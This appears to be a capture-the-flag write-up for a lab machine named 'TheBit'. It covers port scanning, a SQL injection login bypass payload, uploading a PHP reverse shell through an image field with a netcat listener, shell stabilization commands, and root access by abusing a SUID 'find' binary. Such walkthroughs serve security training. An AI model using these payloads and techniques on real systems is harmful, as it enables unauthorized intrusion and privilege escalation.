## TheBit


```
ip = 10.150.150.146
os = linux
```

### nmap scan

from the nmap scan we can see we have 5 open ports
so let's start enumeration from port 80 and going over to the webpage gives this

i came across a login page on clicking the get started button.

so, trying default creds didn't work and since the server is running mysql let's give *SQLI* a trial
using the auth bypass payload  as username and password (tho the vulnerable part is the password field so u can enter anything as username while use the payload as passwd)
```
' or ''='
``` 
gave me admin access

Then we found the FLAG3 in the dashboard

so, let's try to upload a reverse shell 

so, go to the test bank page and click on add question then upload a php reverse shell in the image field and save.

We've set our netcat listener to listen for reverse connection then click on *test bank*  again that should spawn you a shell.
Stabilizing the shell using ``` python -c "import pty;pty.spawn('/bin/bash')" ``` hit enter then ```export TERM=xterm``` And ```ctrl+z``` then  ```stty raw -echo;fg``` 

BOOM!
	
 we are in
	
 so let's check for the user flag

### privilege escalation

Enumerating the binaries having suid permission using the command
```
find / -perm -u=s -type f 2>/dev/null
```

As we can see the *find* binary has suid permission set on it.
so, let's take the advantage for escalating our privilege to root
To do so, let's use the find command on **gtfobins**
```
find . -exec /bin/sh -p \; -quit
```
And we are root

Thanks.
